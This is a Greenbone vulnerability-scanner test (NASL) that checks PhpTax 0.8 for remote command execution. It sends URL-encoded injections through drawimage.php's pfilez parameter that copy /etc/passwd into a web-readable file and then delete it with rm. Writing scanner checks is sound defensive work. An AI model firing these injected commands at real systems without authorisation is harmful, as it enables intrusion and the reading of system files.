# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103582");
  script_version("2025-07-18T15:43:33+0000");
  script_tag(name:"cvss_base", value:"9.7");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:C");
  script_tag(name:"last_modification", value:"2025-07-18 15:43:33 +0000 (Fri, 18 Jul 2025)");
  script_tag(name:"creation_date", value:"2012-10-09 14:42:33 +0200 (Tue, 09 Oct 2012)");
  script_name("PhpTax 0.8 'drawimage.php' Remote Arbitrary Command Execution Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "os_detection.nasl",
                      "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl",
                      "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  # nb: Initial version of this VT only checked /etc/passwd which indicates that this product is
  # only running on Linux. As it doesn't make much sense to throw these checks against every OS
  # these days a more Linux specific mandatory key is used here.
  script_mandatory_keys("Host/runs_unixoide");

  script_xref(name:"URL", value:"https://web.archive.org/web/20210121231052/http://www.securityfocus.com/bid/55759");

  script_tag(name:"summary", value:"PhpTax is prone to a remote arbitrary command execution
  vulnerability because it fails to properly validate user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary commands
  within the context of the vulnerable application.");

  script_tag(name:"affected", value:"PhpTax versions 0.8 is known to be vulnerable. Other versions
  may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");

port = http_get_port( default:80 );
if( ! http_can_host_php( port:port ) )
  exit( 0 );

foreach dir( make_list_unique( "/phptax", "/tax", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" )
    dir = "";

  buf = http_get_cache( item:dir + "/index.php", port:port );

  if( "<title>PHPTAX" >< buf ) {

    vtstrings = get_vt_strings();
    file = vtstrings["lowercase_rand"] + ".txt";

    # nb: No traversal_files() for now as we don't want to change the code below as we don't have
    # access to an affected system anymore and can't test any changes done here.
    ex = "xx%3bcat+%2Fetc%2Fpasswd+%3E+.%2F" + file + "%3b";
    url = dir + "/drawimage.php?pdf=make&pfilez=" + ex;

    if( http_vuln_check( port:port, url:url, pattern:"image/png", check_header:TRUE ) ) {
      url = dir + "/" + file;
      pattern = "root:.*:0:[01]:";
      if( concl = http_vuln_check( port:port, url:url, pattern:pattern, check_header:TRUE ) ) {

        # nb: The purpose of this is seems to be to deleted the file again
        url = dir + "/drawimage.php?pdf=make&pfilez=%3Brm+.%2F" + file  + "%3B";
        http_vuln_check( port:port, url:url, pattern:"none" );

        concl = egrep( string:concl, pattern:pattern, icase:TRUE );
        if( concl )
          report = 'Response:\n\n' + chomp(concl);

        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 99 );
